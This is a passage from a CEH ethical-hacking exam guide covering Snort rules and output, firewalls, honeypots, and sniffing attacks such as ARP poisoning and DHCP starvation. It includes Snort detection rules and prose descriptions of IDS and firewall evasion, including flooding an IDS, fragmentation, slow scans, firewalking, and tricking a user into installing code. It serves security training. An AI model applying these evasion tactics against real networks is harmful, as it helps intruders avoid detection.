Speaking of rule sets, there are loads of them. You can download the rules for Snort
from the Snort site at any time in a giant .zip (.tar) file. The rules are updated constantly,
so good administrators will pull down fresh copies often. Because the rules are separate
from the configuration, all you have to do to update your signature files is to drop the
new copy in the directory holding the old copy. One quick overwrite (and usually a stop/
start of services) is all that’s needed. If you’re looking for some help in managing signature
updates and such, Oinkmaster (http://oinkmaster.sourceforge.net/) is the standard for it.

A rule itself is fairly simple. It must be a single line and is composed of a header
and options. Each rule contains an action, a protocol, the rule format direction (which
could be bidirectional), a source address/port, a destination address/port, and message
parameters. The Snort rule action can be Alert (in a variety of configured methods, alert
when the condition is met), Log (simply make a note when the condition is met), or Pass
(ignore the packet). For example, consider the following rule:

alert tcp !HOME_NET any -> $HOME_NET 31337 (msg :"BACKDOOR
ATTEMPT-Backorifice")

04-ch04.indd 170 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

171

This rule tells Snort, “If you happen to come across a packet from any address that is
not my home network, using any source port, intended for an address within my home
network on port 31337, alert me with the message ‘BACKDOOR ATTEMPT-Backori-
fice.’” Other options you can add to the message section include flags (indicating specific
TCP flags to look for), content (indicating a specific string in the packet’s data payload),
and specialized handling features. For example, consider this rule:

alert tcp !$HOME_NET any -> $HOME_NET 23 (msg:"Telnet attempt..admin access";
content: "admin")

Here’s the meaning: “Please alert on any packet from an address not in my home
network and using any source port number, intended for any address that is within
my home network on port 23, including the ASCII string ‘admin.’ Please write ‘Telnet
attempt..admin access’ to the log.” As you can see, although it looks complicated, it’s
really not that hard to understand. And that’s good news, because you’ll definitely get
asked about rules on the CEH exam.

EXAM TIP You’ll need to be intimately amiliar with the basics o Snort
rule syntax, as well as the raw output rom the packet capture. Pay special
attention in the output to port numbers; most questions can be answered
just by knowing what port numbers go with which protocol and where
to ind them in the output. Also, always watch the directional arrows in
test questions.

Lastly on Snort, you’ll also need to know how to read the output. GUI overlays are
ridiculously easy, so I’m not even going to bother here—you purchased this book, so I’m
relatively certain you can read already. Command-line output, though, requires a little
snooping around. A typical output is listed here (bold added for emphasis):

02/07-11:23:13.014491 0:10:2:AC:1D:C4 -> 0:2:B3:5B:57:A6 type:0x800 len:0x3C
200.225.1.56:1244 -> 129.156.22.15:443 TCP TTL:128 TOS:0x0 ID:17536 IpLen:20 DgmLen:48 DF
******S* Seq: 0xA153BD Ack: 0x0 Win: 0x2000 TcpLen: 28
TCP Options (4) => MSS: 1460 NOP NOP SackOK
0x0000: 00 02 B3 87 84 25 00 10 5A 01 0D 5B 08 00 45 00 .....%..Z..[..E.
0x0010: 00 30 98 43 40 00 80 06 DE EC C0 A8 01 04 C0 A8 .0.C@...........
0x0020: 01 43 04 DC 01 BB 00 A1 8B BD 00 00 00 00 70 02 .C............p.
0x0030: 20 00 4C 92 00 00 02 04 05 B4 01 01 04 02 .L...........

I know, it looks scary, but don’t fret—this is simple enough. The first portion
of the line indicates the date stamp at 11:23 on February 7. The next entry shows
the source and destination MAC addresses of the frame (in this case, the source is
0:10:2:AC:1D:C4 and the destination is 0:2:B3:5B:57:A6). The Ethernet frame type
and length are next, followed by the source and destination IPs, along with the associ-
ated port numbers. This frame, for example, was sent by 200.225.1.56, with source
port 1244, destined for 129.156.22.15 on port 443 (can you say “SSL connection
attempt”?). The portion reading ******S* indicates the SYN flag was set in this packet,
and the sequence and acknowledgment numbers follow. The payload is displayed in
hex digits below everything.

04-ch04.indd 171 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

172

Do you need to remember all this for your exam? Of course you do. The good news is,
though, most of the time you can figure out what’s going on by knowing where to find
the port numbers and source/destination portions of the output. I bolded them in the
preceding code listing for emphasis. I guarantee you’ll see output like this on your exam,
so be ready to answer questions about it.

Firewall
While we’re on the subject of sniffing (and other attack) roadblocks, we can’t ignore the
one everyone has already heard of—the firewall. If you’ve watched a Hollywood movie
having anything whatsoever to do with technology, you’ve heard mention of firewalls.
And, if you’re like me, you cringe every time they bring it up. Script writers must believe
that a firewall is some kind of living, breathing entity that has the capability to automati-
cally sense what the bad guys are doing, and anything that makes it past the firewall is free
and clear. A firewall isn’t the end-all of security; it’s just one tool in the arsenal. Granted, it
can be a powerful tool, but it’s just one piece of the puzzle, not the whole thing.

A firewall is an appliance within a network that is designed to protect internal resources
from unauthorized external access. Firewalls work with a set of rules, explicitly stating
what is allowed to pass from one side of the firewall to the other. Additionally, most fire-
walls work with an implicit deny principle, which means if there is not a rule defined to
allow the packet to pass, it is blocked—there is no need to create a rule to deny packets.
For example, there may be a rule saying port 80 is allowed to pass from external to inter-
nal, but if there is not a rule saying port 443 is allowed, SSL requests to internal resources
are automatically denied.

Another interesting point on most firewalls is that the list of rules that determine traf-
fic behavior is usually read in order, from top to bottom. As soon as a match is made, the
decision on whether to pass the packet is made. For example, an access control list (ACL)
that starts out with an entry of allow ip any any makes the firewall moot—every IP
packet will be allowed to pass because the match is made on the first entry. Most firewalls
are configured with rule sets to allow common traffic, such as port 80 if you’re hosting
web servers and port 53 for DNS lookups, and then rely on implicit deny to protect the
rest of the network.

Many firewalls (just like routers) also implement network address translation
(NAT) at the border, and NAT can be implemented in many different ways. Basic
NAT is a one-to-one mapping, where each internal private IP address is mapped to a
unique public address. As the message leaves the network, the packet is changed to use
the public IP address, and when it is answered and routed back through the Internet
to the firewall (or external router), NAT matches it back to the single corresponding
internal address and sends it along its way. For example, a packet leaving 172.16.1.72
would be changed to 200.57.8.212 for its journey across the Internet. Although the
rest of the world will see IP addresses in your public range, the true senders of the
data packets are internal and use an address from any of the private network classes
(192.168.0.0, 172.16–31.0.0, or 10.0.0.0).

In the real world, though, most organizations and individuals don’t implement a one-
to-one mapping; it’s simply too expensive. A more common method of NAT is NAT
overload, better known as port address translation. This method takes advantage of the

04-ch04.indd 172 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

173

port numbers (and other items) unique to each web conversation to allow many internal
addresses to use one external address. Although we could start an entire conversation
here on how this works and what to watch for, I’m simply mentioning it so you won’t be
caught off guard by it should you see it on the exam.

NOTE I you didn’t already know about NAT, I’d bet dollars to doughnuts
you’re a NAT “overloader” already. I you don’t believe me, check your
wireless router. How many devices do you have connected to it? Each one
has its own private IP address assigned (probably in the 192.168.1.1–254
range), which we all know can’t be routed to or rom the Internet. And I’m
absolutely certain you did not purchase a public IP address range rom your
provider, right? Open the coniguration or your router and check the public-
acing IP address. I’ll bet you’ll ind you’ve been NAT-ing like a pro all along.

Much like IDSs, the placement of firewalls is important. In general, a firewall is placed
on the edge of a network, with one port facing outward, at least one port facing inward,
and another port facing toward a DMZ (an area of the network set aside for servers and
other resources that the outside world would need access to). Some networks apply addi-
tional firewalls throughout the enterprise to segment for various reasons.

EXAM TIP There are a ew deinition terms o note or you. The screened
subnet (aka public zone) o your DMZ is connected to the Internet and hosts
all the public-acing servers and services your organization provides. These
bastion hosts sit outside your internal irewall and are designed to protect
internal network resources rom attack: they’re called bastions because they
can withstand Internet traic attacks. The private zone holds all the internal
hosts that, other than responding to a request rom inside that zone, no
Internet host has any business dealing with. Lastly, because your irewall has
two or more interaces, it is reerred to as multi-homed.

Originally, firewalls were all packet-filtering firewalls. They basically looked at the
headers of packets coming through a port and decided whether to allow them based on
the ACLs configured. Although this does provide the ability to block specific protocols,
the major drawback with packet filtering alone is twofold: it is incapable of examining
the packet’s payload, and it has no means to identify the state of the packet. This gave
rise to stateful inspection, which gives the firewall the means to track the entire status of
a connection. For instance, if a packet arrives with the ACK flag set but the firewall has
no record of the original SYN packet, that indicates a malicious attempt. ECC also calls
these “stateful multilayer inspection” firewalls, with the capability from the Network
layer up to the Application layer (although ECC’s focus is in Layers 3 and 4).

Two other firewall types of note include circuit-level gateway firewalls and application-
level firewalls. A circuit-level gateway firewall works at the Session layer and allows or
prevents data streams—it’s not necessarily concerned with each packet. An application-
level firewall filters traffic much like a proxy, allowing specific applications (services) in
and out of the network based on its rule set.

04-ch04.indd 173 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

174

EXAM TIP HTTP tunneling is a irewall evasion technique you’ll probably
see at least mentioned on the exam. The short o it is, lots o things can
be wrapped within an HTTP shell (Microsot Oice has been doing this or
years). And, because port 80 is almost never iltered by a irewall, you can
crat port 80 segments to carry payloads or protocols the irewall may
have otherwise blocked. HTTP beacons and HTTP tunnels are the de acto
standard implant technology or hackers.

Evasion Techniques
Our brief exposure to IDSs here should give you pause as an ethical hacker; if these tools
work so well, how can we ever break in without being noticed? That’s a fair question, and
the answer on some networks is, “You probably can’t.” Again, we’re not looking to break
into Fort Knox—we’re looking for the easy target. If IDSs are set up correctly, located in
the correct spot on the network, have the latest up-to-date signatures files, and have been
on long enough to identify normal behavior, then, sure, your job is going to be tough.
But just how many of those IDSs are perfectly located and maintained? How many are
run by security staff members who are maybe a little on the complacent side? Think there
may be some misconfigured ones out there or maybe installations with outdated or cor-
rupt signature files? Now we’re talking!

So, how do you get around these things? Well, there are more techniques and methods
to try than you probably have time or patience to read about and memorize, and some
are fairly common sense. For example, why not just flood the network, or DDoS the IDS
or logging server? As the ethical hacker, you could set up some fake attacks, guaranteed to
trigger a few alerts, along with tons and tons of traffic. The sheer volume of alerts might
be more than the staff can deal with, and you may be able to slip by unnoticed. And since
many IDSs use a centralized server (or bank of them) for logging and reporting alerts,
taking them down allows you, the attacker, to carry on.

EXAM TIP EC-Council deines another method o looding called “False
Positive Generation,” where the attacker doesn’t just lood the network
with traic, but speciically sends malicious packets they know will cause
IDS alerts.

Another in the line of seemingly commonsense approaches comes down to simply
having a bit of patience; just learn to slow down. Snort has a great signature file for
tracking port scan attempts, but you do have to set it on a timer. I interviewed a perim-
eter security guy a little while back on this subject and asked him how long he thought,
given enough patience, it would take me to port-scan his entire network (he watches the
perimeter of a huge enterprise network of more than 10,000 hosts). He sighed and told
me if I kept everything under two minutes a pop, I could have the whole thing done in
a matter of a couple of days. Slow down, scan smaller footprints, and take your time—it
will eventually pay off.

04-ch04.indd 174 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

175

NOTE Slower is not only the better choice or hiding your attacks, it’s really
the preerred choice nearly every time. Only the impatient and uneducated
run or nmap’s -T5 switch as their primary choice. The pros will slow things
down with the -T1 switch and get better, more useul results to browse
through.

Other methods might be a tad more involved. For example, evasion through session
splicing—a fancy term for fragmentation—is also a worthwhile tactic. The idea here is to
put payload into packets the IDS usually ignores. SYN segments, for example, usually
have nothing but padding in the data payload. Why not slide small fragments of your
own code in there to reassemble later? You can even try purposefully sending the seg-
ments out of order or sending adjustments with the IP Fragment field. The IDS might
not pick up on this. Again, patience and time pay off.

NOTE Another extremely common IDS evasion technique in the web world
(because it works against web and IDS ilters well) is the use o Unicode
characters. The idea is to use Unicode characters (U+0020 = a space,
U+0036 = the number 6, and U+0041 = a capital letter A) instead o human-
readable code to conuse the signature-based IDS. Sometimes this works
and sometimes it doesn’t—just keep in mind that many Unicode signature
iles are available to look or this very thing.

Some tools you may get asked about or see along the way for IDS evasion are Nes-
sus (also a great vulnerability scanner), ADMmutate (able to create multiple scripts that
won’t be easily recognizable by signature files), NIDSbench (an older tool used for playing
with fragment bits), and Inundator (a flooding tool). IDS Informer is another great tool
that can use captured network traffic to craft, from start to finish, a test file to see what
can make it through undetected. Additionally, many packet-generating tools, such as
Colasoft Packet Builder (https://www.colasoft.com) and WireEdit (https://omnipacket
.com/wireedit) can do the job nicely. Packet Generator (https://www.netscantools.com/
nstpro_packet_generator_tcp.html) and PackETH (http://packeth.sourceforge.net),
shown in Figures 4-10 and 4-11, respectively, are also good choices.

Firewall Evasion
Knowing what a firewall is, where and how it’s most likely to be used in the network,
and how it works (via ACLs and/or stateful inspection) is only part of the battle. What
we really need to know now is how we identify where the firewall is from the outside (in
the middle of our footprinting and attack) and how we can get around it once we find
it. Identifying a firewall location doesn’t require rocket-scientist brainpower, because no
one really even bothers to hide the presence of a firewall. As was covered earlier, a simple
traceroute can show you where the firewall is (returning splats to let you know it has
timed out). If you’re using your sniffer and can look into the packets a little, an ICMP
Type 3 Code 13 shows that the traffic is being stopped (filtered) by a firewall (or router).
An ICMP Type 3 Code 3 tells you the client itself has the port closed. Lastly, banner grab-
bing (covered in Chapter 3) also provides an easy firewall identification method.

04-ch04.indd 175 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

176

Figure 4-10
Packet Generator

Figure 4-11 PackETH

04-ch04.indd 176 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

177

Once you find the firewall (easy), it’s now time to find out ways to get through it
or around it (not so easy). Your first step is to peck away at the firewall in such a man-
ner as to identify which ports and protocols it is letting through and which ones it has
blocked (filtered). This process of “walking” through every port against a firewall to deter-
mine what is open is known as firewalking. Tons of tools are available for this—from
nmap and other footprinting tools, to a tool called Firewalk (from Packet Storm, https://
packetstormsecurity.com/). Whether you set up an nmap scan and document the ports
yourself or use a program that does it for you, the idea is the same: find a port the firewall
will allow through, and start your attack there. Just keep in mind this is generally a noisy
attack, and you will, most likely, get caught.

Of course, the best method available is to have a compromised machine on the inside
initiate all communications for you. Usually firewalls—stateful or packet filtering—don’t
bother looking at packets with internal source addresses leaving the network. So, for
example, suppose you e-mailed some code to a user and had them install it (go ahead,
they will…trust me). The system on the inside could then initiate all communications
for your hacking efforts from the outside, and you’ve found your ticket to ride.

NOTE Some other irewall-hacking tools you may run across include
CovertTCP, ICMP Shell, and 007 Shell. Remember, though, a compromised
system inside the network is your best bet.

When it comes to the actual applications you can use for the task, packet-crafting
and packet-generating tools are the ones you’ll most likely come across in your career for
evading firewalls and IDSs, although a couple of tools are specifically designed for the
task. PackETH (previously shown in Figure 4-11) is a Linux tool from SourceForge that’s
designed to create Ethernet packets for “security testing.” Another SourceForge product
is Packet Generator (see Figure 4-10), which allows you to create test runs of various
packet streams to demonstrate a particular sequence of packets. Netscan also provides a
packet generator in its tool conglomeration. All of these tools allow you to control the
fields in frame and packet headers and, in some cases, interject payload information to
test the entirety of the security platform. Not bad, huh?

Time to Dream, and Think About Security
Every once in a while, something so nerdy and groovy comes around, I just can’t stop
smiling and dreaming about it. Tech has come a long way in my lifetime—heck,
I can remember sitting in my eighth-grade classroom and scoffing at my teacher
announcing the “video tape” (whatever that was) would be in all our homes by the
end of the year—and every once in a while one of the leaps just captures me fully.
When the cell phone came about, I really wanted one of the 12-pound bag phones
to tote around in my car. Imagine it—I could talk to my girlfriend from my car! My
dad told me it was one step closer to Star Trek, and one day we’d have them so small
they’d be stuck to our shirts like Captain Kirk.

(continued )

04-ch04.indd 177 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

178

Today’s tech is astounding, and at times it seems to me there’s nothing left for us
to invent. Then something comes around and I’m right back in high school, dying
for my bag phone, and thinking about Star Trek. This time around, it’s 3D printing.

I know you’ve seen and heard of it, but trust me, we’re only scratching the sur-
face. The following is from http://3dprinting.com/what-is-3d-printing/:

3D printing or additive manufacturing is a process of making three dimen-
sional solid objects from a digital file. The creation of a 3D printed object is
achieved using additive processes. In an additive process an object is created
by laying down successive layers of material until the entire object is created.
Each of these layers can be seen as a thinly sliced horizontal cross-section of
the eventual object.

Did you notice that? A digital file. Suddenly the guy getting sucked into the
video game and digitized to save Tron’s world doesn’t sound so fantastical, does it?
And what about the future for this technology? Sure, we can envision printing our
own furniture and clothes, but what about engines? Cars? Planes? And what if we
get a little more advanced with the materials we can use to work in our “additive
manufacturing”? Could we print our own food? Imagine, just like in Star Trek,
when you wake in the morning and want a cup of coffee, you just say “coffee” and
the little box on the wall prints it for you.

But consider the seedy side for a moment. Printers are gigantic security holes on
our networks today. Could 3D printers be the same? Could the super-secret indus-
trial plans for printing Company A’s game-changing widget be stolen? Or could
a competitor alter them just enough to where the widget doesn’t work? And if we
can print food with them, what happens when the Bride gets mad and decides to
“Kill Bill”? Could she just hack in and add a little arsenic to his sandwich print file?
When security involves data and devices, it’s almost surreal—when it involves lives,
it’s something else altogether.

The promise of 3D printing is worth dreaming about, and we all need to dream
every now and again. Does it also come with nightmares? We’ll just have to see when
we boldly go where no one has gone before.

Honeypots
Our final network roadblock isn’t really designed to stop you at all. Quite to the contrary,
this one is designed to invite you in and make you comfortable. It provides you with a
feeling of peace and tranquility, consistently boosting your ego with little successes along
the way—and, like a long lost relative, encourages you to stay for a while.

A honeypot is a system set up as a decoy to entice attackers. The idea is to load it up with
fake goodies, with not-too-easy vulnerabilities a hacker may exploit. An attacker, desper-
ately looking for something to report as his success, would stumble upon your honeypot
and spend all his time and effort there, leaving your real network, and resources, alone.
While it sounds like a great idea, a honeypot isn’t without its own dangers.

04-ch04.indd 178 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

179

Pooh’s Paradise
Winnie the Pooh, that huggable little fluff-filled iconic yellow bear popularized by
Walt Disney back in the 1960s, sure loved his honey. As much time as he spent with
his face in real pots of honey, I have to imagine his favorite network appliance would
be of the same namesake. And, I’m sure, he’d find his way to some of the honeypot
projects spanning the globe.

Honeypots aren’t just to distract hackers; they’re also great at tracking down all
kinds of information. Combine this knowledge with the absolute loathing world-
wide of unsolicited e-mail and those who forward spam, and it’s not too difficult
to see how groups of people might band their honeypots together in a coordinated
effort to bring the spammers to a halt. Project Honey Pot is one such effort.

Project Honey Pot (www.projecthoneypot.org/) is a web-based network of hon-
eypots using embedded software on various websites to collect information on
spammers. The project collects IP addresses it catches harvesting e-mail addresses
for spam purposes. This information is shared among various law enforcement
agencies to help combat private spammers worldwide. The information collected is
also used in research and development of newer versions of the software to further
improve the efforts of the group as a whole. From their site, it is “the first and only
distributed system for identifying spammers and the spambots they use to scrape
addresses from your website. Using the Project Honey Pot system you can install
addresses that are custom-tagged to the time and IP address of a visitor to your site.
If one of these addresses begins receiving e-mail we not only can tell that the mes-
sages are spam, but also the exact moment when the address was harvested and the
IP address that gathered it.”

Another collaborative effort is The Honeynet Project (www.honeynet.org/),
founded in 1999. An international, nonprofit (501c3) research organization dedi-
cated to improving the security of the Internet at no cost to the public, The Hon-
eynet Project raises awareness of threats and provides a “Know Your Enemy” series
of papers. The project also provides security tools and techniques to help defeat
cyberthreats. It now includes multiple active chapters around the world.

These projects, and others like them, demonstrate the good side of the Internet
and networking altogether. Many open source projects like these are put together
by well-meaning groups simply trying to make the world a better place. Pooh Bear,
no doubt, would love them.

By design a honeypot will be hacked, so this brings up two very important points
regarding it. First, anything and everything on a honeypot system is not to be trusted.
Anything that has that many successful attacks against it could be riddled with loads of
stuff you don’t even know about yet. Don’t put information or resources on the honeypot
that can prove useful to an attacker, and don’t trust anything you pull off it. Granted, the
information and resources have to look legitimate; just make sure they’re not.

04-ch04.indd 179 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

180

Second, the location of the honeypot is of utmost importance. You want this to be
seen by the outside world, so you could place it outside the firewall. However, is that
really going to fool anyone? Do you really believe a seasoned attacker is just going to
accept the fact an administrator protected everything on the network by putting every-
thing behind a firewall but just forgot this really important server on the outside? A
better, more realistic placement is inside the DMZ. A hacker will discover pretty quickly
where the firewall is, and placing a hard-to-find port backdoor to your honeypot is just
the ticket to draw them in. Wherever the honeypot winds up being located, it needs to
be walled off to prevent it becoming a launching pad for further attacks.

There are four types of honeypots: high, medium, and low interaction, and “pure.” A
high-interaction honeypot simulates all services and applications and is designed to be
completely compromised. A medium-interaction honeypot simulates a real operating
system and several applications and services. A low-interaction honeypot simulates a lim-
ited number of services and cannot be compromised completely (by design). Lastly, the
“pure” honeypot emulates the actual production network of the organization.

Of course, in the real world almost no one has the time, interest, or concern for
installing and maintaining a honeypot. And most real hackers know they’re in one pretty
quickly and that the payoff (that is, getting anything substantially useful out of it) is
oftentimes nothing. But it is testable material, so learn what you must.

EXAM TIP Silly as it may sound, just stick with the exact wording and
memorize these honeypot types. You won’t be given one to crawl around in
on the exam, only to then be asked which type it is—you’ll be given a basic
knowledge question designed to test your memory.

Chapter Review
Sniffing (aka wiretapping by law enforcement) is the art of capturing packets as they pass
on a wire, or over the airwaves, to review for interesting information. The process of
sniffing comes down to a few items of great importance: what state the NIC is in, what
access medium you are connected to, and what tool you’re running.

A sniffer needs your card to run in promiscuous mode. This simply means that, regard-
less of address, if the frame is passing on the wire, the NIC will grab it and pull it in
for a look. Pcap is needed for your card to effectively slip into promiscuous mode. On
Windows, the de facto driver/library choice is WinPcap. On Linux, it’s libpcap.

As long as your system is within the same collision domain, right out of the box, and
you don’t change a thing, your NIC will see every message intended for anyone else in the
domain. Collision domains are composed of all the machines sharing any given transport
medium. All systems connected to a hub share the same collision domain. Switches split
collision domains so that each system connected to the switch resides in its own little col-
lision domain—the switch sends frames down a wire for a given computer only if they’re
intended for the recipient. If your computer is connected to a switch, you receive only
those messages intended for your own NIC.

04-ch04.indd 180 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

181

There are some important protocols in the upper layers for you to pay attention to in
sniffing. Simple Mail Transfer Protocol was designed to carry an e-mail message. Because
it was written to carry nothing but ASCII, everything sent via SMTP, with no encryp-
tion added at another layer, is sent as clear text. FTP requires a user ID and password
to access the server (usually), but the information is passed in clear text over the wire.
TFTP passes everything in clear text, and you can pull keystrokes from a sniffed Telnet
session. SNMPv1 and NNTP send their passwords and data over clear text, as do IMAP
and POP3.

Address Resolution Protocol (ARP) resolves IP addresses to machine (MAC) addresses.
As a frame is being built inside the sending machine, the system sends an ARP_REQUEST
to find out which MAC address inside the subnet can process the message. The machine
on the local subnet with the requested IP responds with an ARP_REPLY. The protocol
retains a cache on machines as it works, and it works on a broadcast basis. The cache is
dynamic—that is, the information in it doesn’t stay there forever, and when your system
gets an updated ARP message, it overwrites the cache with the new information. A gratu-
itous ARP is a special packet that updates the ARP cache of other systems before they even
ask for it—in other words, before they send an ARP_REQUEST.

IPv6 uses a 128-bit address instead of the 32-bit IPv4 version, and it is represented as
eight groups of four hexadecimal digits separated by colons (for example, 2002:0b58:8
da3:0041:1000:4a2e:0730:7443). Leading zeros from any groups of hexadecimal digits
can be removed, and consecutive sections of zeros can be replaced with a double colon
(::). The IPv6 “loopback” address is 0000:0000:0000:0000:0000:0000:0000:0001 and
may be edited all the way down to ::1.

IPv6 address types include unicast, multicast, and anycast, and the scope for multi-
cast and unicast includes link local, site local, and global. There is no equivalent in IPv6
to the broadcast address of IPv4. Unicast is just like IPv4 (addressed for one recipient)
and so is multicast (addressed for many). Anycast works just like multicast; however,
whereas multicast is intended to be received by a bunch of machines in a group, anycast
is designed to be received and opened only by the closest member of the group. In IPv6,
the address block fe80::/10 has been reserved for link-local addressing. The unique local
address (the counterpart of IPv4 private addressing) is in the fc00:: /7 block. Prefixes for
site-local addresses will always be FEC0::/10.

Lawful interception is the process of legally intercepting communications between two
(or more) parties for surveillance on telecommunications, VoIP, data, and multiservice
networks. Wiretapping (monitoring a phone or Internet conversation) can be active or
passive. Active wiretapping involves interjecting something into the communication
(traffic), for whatever reason. Passive wiretapping only monitors and records the data.
PRISM (Planning Tool for Resource Integration, Synchronization, and Management) is
the data tool used to collect foreign intelligence passing through U.S. network resources.

EC-Council breaks sniffing down into two main categories: passive and active. Passive
sniffing is exactly what it sounds like: plug in a sniffer and, without any other interaction
needed on your part, start pulling data packets to view at your leisure. Passive sniffing
works only if your machine’s NIC is part of the same collision domain as the targets you
want to listen to (and it’s configured to listen). Active sniffing requires some additional

04-ch04.indd 181 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

182

work on your part, either from a packet injection or manipulation stance or from forc-
ing network devices to play nicely with your efforts. Active sniffing usually means the
collision domain you are part of is segmented from those you want to look in to (which
means you’re probably attached to a switch), and you’ll have to take proactive steps in
order to sniff.

One trick for active sniffing purposes is to get a switch to close the port you are con-
nected to every time it closes the port you want to sniff. A span port (also called port
mirroring) is one in which the switch configuration has been altered to send a copy of all
frames from one port, or a succession of ports, to another.

Another option you have is to fill the content addressable memory (CAM) table, such
that the switch can’t keep up and floods all packets. This process is known as MAC flood-
ing. Etherflood and Macof are examples of tools you can use to conduct MAC flooding.
Switch port stealing refers to the process of flooding the CAM with unsolicited ARPs
regarding specific ports, thus creating a race condition.

ARP poisoning is the process of maliciously changing an ARP cache on a machine
to inject faulty entries. Most modern switches have built-in defenses for too many
ARP broadcasts coming across the wire (for example, you can configure Dynamic ARP
Inspection using DHCP snooping inside Cisco IOS). Also, administrators can put to
use a wide variety of network monitoring tools, such as XArp, to watch for this, and
some network administrators manually add the default gateway MAC permanently
(using arp -s) into the ARP cache on each device. A couple of tools that make ARP
flooding as easy as pressing a button are Cain and Abel, WinArpAttacker, Ufasoft, and
dsniff (a collection of Linux tools that includes a tool called ARPspoof ).

DHCP starvation is an attack whereby the malicious agent attempts to exhaust all
available addresses from the server. Packets in the DHCP exchange include DHCP-
DISCOVER, DHCP OFFER, DHCPREQUEST, and DHCPACK. The corresponding
packets in DHCPv6 are known as Solicit, Advertise, Request (or Confirm/Renew), and
Reply, respectively. Tools such as Yersinia and Dhcpstarv can carry out DHCP starva-
tion attacks, and configuring DHCP snooping on your network device is considered the
proper mitigation against this attack. Another fun DHCP attack is using a rogue DHCP
server. An attacker sets up his own DHCP server on the network and starts handing out
bad IP addresses to legitimate systems connecting to the network. Whether in conjunc-
tion with the DHCP starvation attack or not, this could allow an attacker to redirect
communications sessions.

MAC spoofing (aka MAC duplication) is a simple process of figuring out the MAC
address of the system you wish to sniff traffic from and changing your MAC address to
match it. IRDP spoofing is an attack where the hacker sends spoofed ICMP Router Dis-
covery Protocol messages through the network, advertising whatever gateway she wants
all the system to start routing messages to. DNS poisoning is much the same as ARP
poisoning, just with DNS entries.

Wireshark is probably the most popular sniffer available, can capture packets from
wired or wireless networks, and provides a fairly easy-to-use interface. Wireshark also
offers an almost innumerable array of filters you can apply to any given sniffing session,
and you can fine-tune your results to exactly what you’re looking for. Filters are of great

04-ch04.indd 182 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

183

use when you set up a packet capture for a long period of time, and they will show up in
bunches on your exam. For example, the string ! (arp or icmp or dns) filters out all the
annoying ARP, ICMP, and DNS packets from your display. The http.request string dis-
plays all the HTTP GET requests, while the tcp contains string argument displays all
TCP segments that contain the word “string.” The expression ip.addr==172.17.15.12
&& tcp.port==23 displays all Telnet packets containing the IP address 172.17.15.12,
while the expression ip.addr==172.17.15.12 or ip.addr==172.17.15.60 shows pack-
ets containing either address. Make very sure you are familiar with what the equal to,
and, and or conjunctions mean. Equal to (==) means exactly what it says—the packet
will display if the argument appears in the packet. And (&&) means the packet will
display only if both arguments appear. Or (or) means the packet will display if either
argument appears.

Intrusion detection systems (IDSs) are hardware and/or software devices that examine
streams of packets for unusual or malicious behavior. Sometimes this is done via a signa-
ture list, where the IDS compares packets against a list of known traffic patterns that indi-
cate an attack. When a match is made, the alarm sounds. Other IDSs may be anomaly
(or behavior) based, making decisions on alerts based on learned behavior and “normal”
patterns—anything out of the ordinary for a normal day sounds the alarm. Libwhisker
is a full-featured Perl library used for HTTP-related functions, including vulnerability
scanning, exploitation, and, of course, IDS evasion.

A false positive occurs when a system alerts on traffic as being malicious when it is not.
A false negative occurs when the IDS reports a particular stream of traffic is just fine, with
no corresponding alarm or alert, when, in fact, an intrusion attempt did occur. False nega-
tives are considered far worse than false positives, for obvious reasons. A host-based IDS
(HIDS) is usually a software program that resides on the host itself. A network-based
IDS (NIDS) sits on the network perimeter.

Snort is an open source IDS that is a powerful sniffer as well as a traffic-logging, pro-
tocol-analyzing tool that can detect buffer overflows, port scans, operating system finger-
printing, and almost every conceivable external attack or probe you can imagine. Snort
runs in three different modes. Sniffer mode lets you watch packets in real time as they
come across your network tap. Packet Logger mode saves packets to disk for review at a
later time. Network Intrusion Detection System mode analyzes network traffic against
various rule sets you pick from, depending on your network’s situation. NIDS mode can
then perform a variety of actions based on what you’ve told it to do.

The Snort configuration file resides in /etc/snort on Unix/Linux installations and in
c:\snort\etc\ on most Windows installations. The configuration file is used to launch
Snort and contains a list of which rule sets to engage at startup. To start Snort, use

snort -l c:\snort\log\ -c c:\snort\etc\snort.conf

Snort rules are simple. They must be a single line and are composed of a header and
options. Each rule contains an action, a protocol, the rule format direction (which
could be bidirectional), a source address/port, a destination address/port, and message
parameters. A Snort rule action can be Alert (in a variety of configured methods, alert
when the condition is met), Log (simply make a note when the condition is met), or

04-ch04.indd 183 14/09/21 3:54 PM



